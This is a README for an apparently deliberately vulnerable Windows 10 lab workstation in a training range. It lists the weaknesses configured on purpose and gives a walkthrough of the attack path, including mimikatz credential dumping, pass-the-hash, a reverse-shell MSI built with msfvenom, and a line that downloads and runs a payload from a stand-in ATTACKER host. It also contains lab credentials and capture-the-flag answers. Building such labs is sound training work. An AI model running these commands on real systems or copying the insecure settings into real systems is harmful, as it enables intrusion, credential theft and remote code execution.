# 💻 Machine 12 — int-win10-01 (Windows 10 Internal Workstation)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

**Hostname:** `VULNCORP-WS01`  
**IP:** `192.168.1.60`  
**Zone:** Internal (`192.168.1.0/24`)  
**OS:** Windows 10 Pro (21H2)  
**Role:** Domain-joined workstation — lateral movement target after DC compromise

---

## 🚀 One-Command Deployment (PowerShell)

On a fresh **Windows 10 Pro VM** with IP `192.168.1.60`, domain-joined to `vulncorp.local`:

1. Open **PowerShell as Administrator**.
2. Run:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\deploy_ws.ps1
```

---

## 🎯 Configured Vulnerabilities

| # | Vulnerability | CVE / Identifier | Severity |
|---|--------------|------------------|----------|
| 1 | **EternalBlue (MS17-010)** — SMBv1 enabled, unpatched | CVE-2017-0144 | Critical (9.8) |
| 2 | **PrintNightmare** — Print Spooler service running, unpatched | CVE-2021-34527 | Critical (9.8) |
| 3 | **WDigest Plaintext Creds** — `UseLogonCredential=1` in registry; lsass caches cleartext | CWE-312 | High (7.8) |
| 4 | **Stored Domain Admin credentials** in a world-readable PowerShell script | CWE-312 / CWE-538 | High (7.8) |
| 5 | **AutoRun / AutoPlay abuse** — `NoDriveTypeAutoRun` disabled (USB autorun attack) | CWE-641 | Medium (6.5) |
| 6 | **RDP without NLA** — Remote Desktop on port 3389 without Network Level Authentication | CWE-306 | Medium (5.3) |
| 7 | **Windows Defender disabled** — real-time protection turned off via registry + GPO | CWE-693 | High (7.5) |
| 8 | **Unquoted Service Path** — `VulnCorpHelperSvc` installed with unquoted path enabling privilege escalation | CWE-428 | High (7.8) |
| 9 | **AlwaysInstallElevated** — MSI packages run as SYSTEM for any user | CWE-269 | High (7.8) |
| 10 | **Scheduled Task running as SYSTEM with writable script** — `C:\Scripts\cleanup.ps1` world-writable | CWE-732 | High (7.8) |

---

## 🔍 Attack Path

```
[int-dc01] ─── DCSync → dump Administrator hash
                │
                ▼ Pass-the-Hash / RDP (port 3389)
         [int-win10-01]  192.168.1.60
                │
                ├── WDigest → mimikatz lsadump → cleartext john.doe creds
                ├── Unquoted Service Path → SYSTEM shell
                ├── AlwaysInstallElevated → malicious .msi → SYSTEM
                └── Writable Scheduled Task → code exec as SYSTEM
```

### Step-by-step

**Step 1 — Initial Access via RDP**
```
Credential leaked in int-dc01 DB:
  Host: 192.168.1.60
  User: Administrator
  Pass: W1nd0ws@Admin!

xfreerdp /u:Administrator /p:'W1nd0ws@Admin!' /v:192.168.1.60
```
Or pass-the-hash after DC compromise:
```bash
impacket-wmiexec -hashes :NTHASH VULNCORP/Administrator@192.168.1.60
```

**Step 2 — WDigest Plaintext Password Extraction**
```powershell
# Confirm WDigest is on (done by deploy script)
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
# UseLogonCredential = 1

# On attacker (after getting a session):
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" exit
# → Reveals john.doe : Corp@Admin2024  in cleartext
```

**Step 3 — Unquoted Service Path Privilege Escalation**
```powershell
# Enumerate unquoted services
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Result:
# VulnCorpHelperSvc  C:\Program Files\VulnCorp Helper\bin\helper.exe

# Drop malicious binary to exploit unquoted path:
# Windows tries: C:\Program.exe → C:\Program Files\VulnCorp.exe → C:\Program Files\VulnCorp Helper\bin\helper.exe
cp shell.exe "C:\Program Files\VulnCorp.exe"
sc stop VulnCorpHelperSvc; sc start VulnCorpHelperSvc
# → SYSTEM shell
```

**Step 4 — AlwaysInstallElevated**
```powershell
# Verify keys are set (done by deploy script):
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated

# Generate malicious MSI and install:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
# → SYSTEM reverse shell
```

**Step 5 — Writable Scheduled Task**
```powershell
# Scheduled task runs C:\Scripts\cleanup.ps1 every minute as SYSTEM
# File is world-writable:
icacls C:\Scripts\cleanup.ps1
# → Everyone:(F)

# Append payload:
Add-Content C:\Scripts\cleanup.ps1 'iex (New-Object Net.WebClient).DownloadString("http://ATTACKER/payload.ps1")'
# Wait ~60 seconds → SYSTEM code execution
```

---

## 🏆 Flags

| Flag | Location | How to Obtain |
|------|----------|---------------|
| `VULN{wdig3st_cl34rt3xt_cr3dz}` | `C:\flags\wdigest_flag.txt` | Read after dumping WDigest creds |
| `VULN{unqu0t3d_s3rv1c3_syst3m}` | `C:\flags\privesc_flag.txt` | Read after SYSTEM shell via unquoted path |
| `VULN{4lw4ys_1nst4ll_3l3v4t3d}` | `C:\flags\msi_flag.txt` | Read after SYSTEM shell via AlwaysInstallElevated |

---

## 🔗 Connection to Next Targets

After owning this workstation, the `C:\Users\john.doe\Documents\network_notes.txt` file reveals:
- `int-backup01` (`192.168.1.50`) rsync credentials
- Domain Admin hash (usable for pass-the-hash to any domain machine)
